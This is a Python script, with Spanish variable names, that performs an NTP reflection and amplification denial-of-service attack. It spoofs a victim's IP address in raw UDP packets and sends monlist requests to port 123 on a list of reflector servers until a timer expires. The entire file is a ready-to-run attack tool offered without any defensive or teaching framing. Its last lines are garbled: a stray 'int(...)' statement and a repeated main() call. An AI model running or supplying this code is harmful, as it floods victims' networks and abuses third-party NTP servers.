import sys
import random
import time
import socket
from pinject import *

def main():
    global lista, puerto, target, tiempo, payload
    payload = '\x17\x00\x02\x2a'+'\x00'*4
    lista = sys.argv[1]
    puerto = int(sys.argv[3])
    target = sys.argv[2]
    tiempo = time.time() + int(sys.argv[4])
    ataque()

def ataque():
    while 1:
        if time.time() > tiempo:
            break;
        else:
            cargar = open(lista).readlines()
            elegir = random.choice(cargar)
            pass;
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_header = UDP(puerto, 123, payload).pack(elegir, target)
        ip_header = IP(elegir, target, udp_header, socket.IPPROTO_UDP).pack()
        sock.sendto(ip_header+udp_header+payload, (elegir, 123))
        print("Amplificando desde " + elegir)


main()
int("Atacando desde " + elegir)


main()
